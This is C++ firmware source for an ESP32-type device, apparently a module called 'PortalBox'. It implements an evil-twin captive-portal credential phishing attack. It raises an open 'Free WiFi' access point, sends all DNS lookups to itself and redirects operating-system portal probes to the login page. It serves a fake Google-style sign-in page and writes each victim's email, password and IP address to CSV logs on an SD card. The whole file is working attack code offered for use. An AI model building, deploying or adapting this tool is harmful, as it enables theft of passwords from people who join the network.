#include "portalbox.h"

#include <DNSServer.h>
#include <FS.h>
#include <LittleFS.h>
#include <SD.h>
#include <WebServer.h>
#include <WiFi.h>
#include <time.h>

#include "wifi_link.h"

// ---------------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------------
static const char  *PORTAL_DIR       = "/portals";
static const char  *CAPTURE_DIR      = "/captures";
static const size_t MAX_PORTAL_FILES = 16;
static const char  *DEFAULT_SSID     = "Free WiFi";
static const uint8_t DEFAULT_CHANNEL = 6;
static const int     SD_CS_PIN       = 5;   // onboard microSD slot (VSPI)
static const int     SPKR_PIN        = 26;  // speaker amp, taken from the portalbox project
static const uint32_t CLIENT_POLL_MS = 1000;

// ---------------------------------------------------------------------------
// Pages
// ---------------------------------------------------------------------------
static const char FALLBACK_PORTAL[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Sign in</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:8vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:4px;font-size:16px}
h2{font-weight:400;margin:0 0 4px}p{color:#5f6368;font-size:14px}</style></head><body>
<div class=card><h2>Sign in</h2><p>to continue to WiFi</p>
<form action="/get" method="GET">
<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<button>Sign in</button></form></div></body></html>)HTML";

static const char ACK_PAGE[] PROGMEM = R"HTML(<!doctype html><html><head>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Connected</title>
<style>body{font-family:sans-serif;background:#f1f3f4;display:flex;justify-content:center;padding-top:10vh}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:320px;text-align:center}
h2{font-weight:400;color:#188038}</style></head><body>
<div class=card><h2>You're connected</h2><p>You can close this page.</p></div></body></html>)HTML";

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
static WebServer server(80);
static DNSServer dns;

static bool     active      = false;
static bool     sdReady     = false;
static bool     flashReady  = false;
static bool     beepEnabled = false;
static String   apSsid;
static uint8_t  apChannel   = DEFAULT_CHANNEL;
static String   selectedPortal;
static uint32_t captureCount = 0;
static String   lastEmail;
static uint8_t  clients      = 0;
static uint32_t revision     = 0;
static uint32_t lastClientMs = 0;

static String portalNames[MAX_PORTAL_FILES];
static size_t portalSizes[MAX_PORTAL_FILES];
static size_t portalNameCount = 0;

// ---------------------------------------------------------------------------
// Storage
// ---------------------------------------------------------------------------
static fs::FS &store() { return sdReady ? (fs::FS &)SD : (fs::FS &)LittleFS; }

const char *pbBackendName() {
  if (sdReady) return "sd";
  if (flashReady) return "flash";
  return "none";
}

static String baseName(const String &path) {
  const int slash = path.lastIndexOf('/');
  return slash >= 0 ? path.substring(slash + 1) : path;
}

static String portalPath(const String &name) { return String(PORTAL_DIR) + "/" + name; }
static bool   portalExists(const String &name) { return store().exists(portalPath(name)); }

// Portal filenames come from the network/console, so keep them boring.
static bool validName(const String &name) {
  if (name.length() == 0 || name.length() > 40) return false;
  if (name.indexOf("..") >= 0) return false;
  for (unsigned i = 0; i < name.length(); i++) {
    const char c = name[i];
    if (!(isalnum(c) || c == '.' || c == '-' || c == '_')) return false;
  }
  return true;
}

static void refreshPortalList() {
  portalNameCount = 0;
  File dir = store().open(PORTAL_DIR);
  if (!dir) return;
  for (File f = dir.openNextFile(); f && portalNameCount < MAX_PORTAL_FILES; f = dir.openNextFile()) {
    if (!f.isDirectory()) {
      portalSizes[portalNameCount] = (size_t)f.size();
      portalNames[portalNameCount++] = baseName(String(f.name()));
    }
    f.close();
  }
  dir.close();
}

// Copies every flash portal page the card does not already have. The card is
// the authority: an existing file is never overwritten, so pages added or
// edited on the card survive a re-seed. Returns how many files were copied.
static size_t syncFromFlash() {
  if (!sdReady || !flashReady) return 0;
  size_t copied = 0;
  File src = LittleFS.open(PORTAL_DIR);
  if (!src) return 0;
  for (File f = src.openNextFile(); f; f = src.openNextFile()) {
    const String name = baseName(String(f.name()));
    if (!f.isDirectory() && validName(name) && !SD.exists(portalPath(name))) {
      File out = SD.open(portalPath(name), "w");
      if (out) {
        while (f.available()) out.write(f.read());
        out.close();
        copied++;
        Serial.printf("[PB  ] Card seeded with %s\n", name.c_str());
      }
    }
    f.close();
  }
  src.close();
  return copied;
}

static uint32_t countLines(const String &path) {
  File f = store().open(path, "r");
  if (!f) return 0;
  uint32_t n = 0;
  while (f.available()) {
    if (f.read() == '\n') n++;
  }
  f.close();
  return n;
}

// ---------------------------------------------------------------------------
// Capture log
// ---------------------------------------------------------------------------
static String sanitize(String v) {
  v.replace("\\", "_");
  v.replace(",", ";");
  v.replace("\"", "'");
  v.replace("\r", "");
  v.replace("\n", "");
  return v;
}

// Epoch seconds, or 0 when NTP has not set the clock yet.
static uint32_t epochNow() {
  const time_t t = time(nullptr);
  return t > 1600000000 ? (uint32_t)t : 0;
}

static void captureAdd(const String &email, const String &pass, const String &ip) {
  const String e  = sanitize(email);
  const String p  = sanitize(pass);
  const String ts = String(epochNow());
  const String line = ts + "," + ip + "," + selectedPortal + ",\"" + e + "\",\"" + p + "\"\n";

  File all = store().open(String(CAPTURE_DIR) + "/all.csv", "a");
  if (all) { all.print(line); all.close(); }
  if (selectedPortal.length()) {
    File pf = store().open(String(CAPTURE_DIR) + "/" + selectedPortal + ".csv", "a");
    if (pf) { pf.print(line); pf.close(); }
  }

  captureCount++;
  lastEmail = e;
  revision++;
  if (beepEnabled) tone(SPKR_PIN, 1568, 120);
  // The password stays on the card; the live log carries the count only.
  Serial.printf("[PB  ] Capture %lu from %s portal=%s\n", (unsigned long)captureCount, ip.c_str(),
                selectedPortal.length() ? selectedPortal.c_str() : "fallback");
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------
static void redirectToPortal() {
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.sendHeader("Cache-Control", "no-cache");
  server.send(302, "text/plain", "");
}

static void servePortal() {
  if (selectedPortal.length() && portalExists(selectedPortal)) {
    File f = store().open(portalPath(selectedPortal), "r");
    if (f) {
      server.streamFile(f, "text/html");
      f.close();
      return;
    }
  }
  server.send_P(200, "text/html", FALLBACK_PORTAL);
}

static void handleGet() {
  const String email = server.arg("email");
  const String pass  = server.arg("password");
  captureAdd(email, pass, server.client().remoteIP().toString());
  server.send_P(200, "text/html", ACK_PAGE);
}

static void registerRoutes() {
  server.on("/", HTTP_GET, servePortal);
  server.on("/get", HTTP_GET, handleGet);                     // Marauder-compatible contract
  server.on("/ack", HTTP_GET, []() { server.send_P(200, "text/html", ACK_PAGE); });

  // OS captive-portal probes pop the login page on the client.
  static const char *probes[] = {"/generate_204", "/gen_204", "/hotspot-detect.html",
                                 "/library/test/success.html", "/ncsi.txt", "/connecttest.txt",
                                 "/redirect", "/canonical.html", "/success.txt", "/fwlink"};
  for (size_t i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
    server.on(probes[i], HTTP_GET, redirectToPortal);
  }
  server.onNotFound(redirectToPortal);
}

// ---------------------------------------------------------------------------
// Lifecycle
// ---------------------------------------------------------------------------
void pbBegin() {
  // Arduino's LittleFS looks for a partition labelled "spiffs"; partitions.csv
  // labels ours "littlefs", so the mount has to name it.
  flashReady = LittleFS.begin(true, "/littlefs", 10, "littlefs");
  if (!flashReady) Serial.println(F("[PB  ] LittleFS mount failed - flash backend unavailable"));

  sdReady = SD.begin(SD_CS_PIN);   // cs IO5, confirmed mounted on CH-01 2026-09-30
  if (!sdReady) Serial.println(F("[PB  ] No microSD card - flash backend only"));

  if (sdReady || flashReady) {
    if (!store().exists(PORTAL_DIR)) store().mkdir(PORTAL_DIR);
    if (!store().exists(CAPTURE_DIR)) store().mkdir(CAPTURE_DIR);
  }
  const size_t seeded = (sdReady && flashReady) ? syncFromFlash() : 0;
  if (seeded) Serial.printf("[PB  ] %u page(s) copied from flash to the card\n", (unsigned)seeded);

  refreshPortalList();
  if (portalNameCount && !selectedPortal.length()) selectedPortal = portalNames[0];
  captureCount = countLines(String(CAPTURE_DIR) + "/all.csv");
  revision++;

  Serial.printf("[PB  ] PortalBox ready: store=%s portals=%u captures=%lu\n", pbBackendName(),
                (unsigned)portalNameCount, (unsigned long)captureCount);
  if (sdReady)
    Serial.printf("[PB  ] microSD: %llu MB total\n", (unsigned long long)(SD.totalBytes() >> 20));
  if (flashReady)
    Serial.printf("[PB  ] LittleFS: %llu of %llu KB used\n",
                  (unsigned long long)(LittleFS.usedBytes() >> 10),
                  (unsigned long long)(LittleFS.totalBytes() >> 10));
  for (size_t i = 0; i < portalNameCount; i++) Serial.printf("[PB  ]   portal: %s\n", portalNames[i].c_str());
}

bool pbActive() { return active; }

bool pbStart() {
  if (active) return true;
  if (!sdReady && !flashReady)
    Serial.println(F("[PB  ] No storage - built-in page only, captures are not logged"));

  // The hub's setup AP and the portal AP cannot share the radio.
  if (linkPortalActive()) linkClosePortal();
  linkSuspend();

  apSsid    = apSsid.length() ? apSsid : String(DEFAULT_SSID);
  apChannel = apChannel ? apChannel : DEFAULT_CHANNEL;

  WiFi.mode(WIFI_AP);
  if (!WiFi.softAP(apSsid.c_str(), nullptr, apChannel)) {
    Serial.println(F("[PB  ] softAP failed - AP not started"));
    linkResume();
    return false;
  }

  dns.start(53, "*", WiFi.softAPIP());   // wildcard DNS -> everything resolves here
  registerRoutes();
  server.begin();

  active     = true;
  clients    = 0;
  lastClientMs = millis();
  revision++;
  Serial.printf("[PB  ] Portal AP up: ssid=\"%s\" ch=%u ip=%s portal=%s\n", apSsid.c_str(),
                apChannel, WiFi.softAPIP().toString().c_str(),
                selectedPortal.length() ? selectedPortal.c_str() : "fallback");
  return true;
}

void pbStop() {
  if (!active) return;
  server.stop();
  dns.stop();
  WiFi.softAPdisconnect(true);
  active  = false;
  clients = 0;
  revision++;
  Serial.println(F("[PB  ] Portal AP down"));
  linkResume();
}

void pbLoop(uint32_t now) {
  if (!active) return;
  dns.processNextRequest();
  server.handleClient();

  if (now - lastClientMs >= CLIENT_POLL_MS) {
    lastClientMs = now;
    const uint8_t n = (uint8_t)WiFi.softAPgetStationNum();
    if (n != clients) {
      clients = n;
      revision++;
    }
  }
}

uint32_t pbRevision() { return revision; }

// ---------------------------------------------------------------------------
// Access point settings
// ---------------------------------------------------------------------------
const String &pbSsid() { return apSsid; }

void pbSetSsid(const String &ssid) {
  apSsid = ssid;
  revision++;
}

uint8_t pbChannel() { return apChannel; }

void pbSetChannel(uint8_t channel) {
  apChannel = channel ? channel : DEFAULT_CHANNEL;
  revision++;
}

String pbApIp() { return active ? WiFi.softAPIP().toString() : String("192.168.4.1"); }
uint8_t pbClients() { return clients; }

// ---------------------------------------------------------------------------
// Portal library
// ---------------------------------------------------------------------------
size_t pbPortalCount() { return portalNameCount; }

String pbPortalAt(size_t index) { return index < portalNameCount ? portalNames[index] : String(); }

size_t pbPortalSize(size_t index) { return index < portalNameCount ? portalSizes[index] : 0; }

String pbSelectedPortal() { return selectedPortal; }

bool pbSelectPortal(const String &name) {
  if (!validName(name) || !portalExists(name)) return false;
  selectedPortal = name;
  revision++;
  Serial.printf("[PB  ] Portal selected: %s\n", name.c_str());
  return true;
}

bool pbSelectNextPortal() {
  if (!portalNameCount) return false;
  size_t next = 0;
  for (size_t i = 0; i < portalNameCount; i++) {
    if (portalNames[i] == selectedPortal) { next = (i + 1) % portalNameCount; break; }
  }
  return pbSelectPortal(portalNames[next]);
}

bool pbDeletePortal(const String &name) {
  if (!validName(name) || !portalExists(name)) return false;
  if (!store().remove(portalPath(name))) return false;
  Serial.printf("[PB  ] Portal deleted: %s\n", name.c_str());
  if (selectedPortal == name) selectedPortal = "";
  refreshPortalList();
  if (!selectedPortal.length() && portalNameCount) selectedPortal = portalNames[0];
  revision++;
  return true;
}

size_t pbSyncFromFlash() {
  if (!sdReady) {
    Serial.println(F("[PB  ] No card mounted - nothing to sync to"));
    return 0;
  }
  const size_t copied = syncFromFlash();
  if (copied) {
    refreshPortalList();
    if (!selectedPortal.length() && portalNameCount) selectedPortal = portalNames[0];
    revision++;
  }
  return copied;
}

uint64_t pbStoreUsedBytes()  { return sdReady ? SD.usedBytes()  : (flashReady ? LittleFS.usedBytes()  : 0); }
uint64_t pbStoreTotalBytes() { return sdReady ? SD.totalBytes() : (flashReady ? LittleFS.totalBytes() : 0); }

// ---------------------------------------------------------------------------
// Captures
// ---------------------------------------------------------------------------
uint32_t pbCaptureCount() { return captureCount; }
String   pbLastCaptureEmail() { return lastEmail; }

void pbDumpCaptures(Stream &out) {
  File f = store().open(String(CAPTURE_DIR) + "/all.csv", "r");
  if (!f) {
    out.println(F("ERR no captures"));
    return;
  }
  while (f.available()) out.write(f.read());
  f.close();
  out.println(F("OK"));
}

void pbClearCaptures() {
  // Remove one file per pass: safe while iterating FAT/LittleFS directories.
  for (int pass = 0; pass < 64; pass++) {
    File dir = store().open(CAPTURE_DIR);
    if (!dir) break;
    File f = dir.openNextFile();
    if (!f) { dir.close(); break; }
    const String p = String(CAPTURE_DIR) + "/" + baseName(String(f.name()));
    f.close();
    dir.close();
    store().remove(p);
  }
  captureCount = 0;
  lastEmail    = "";
  revision++;
  Serial.println(F("[PB  ] Captures cleared"));
}

// ---------------------------------------------------------------------------
// Beep
// ---------------------------------------------------------------------------
bool pbBeepEnabled() { return beepEnabled; }

void pbSetBeep(bool on) {
  beepEnabled = on;
  revision++;
  Serial.printf("[PB  ] Capture beep %s\n", on ? "on" : "off");
}
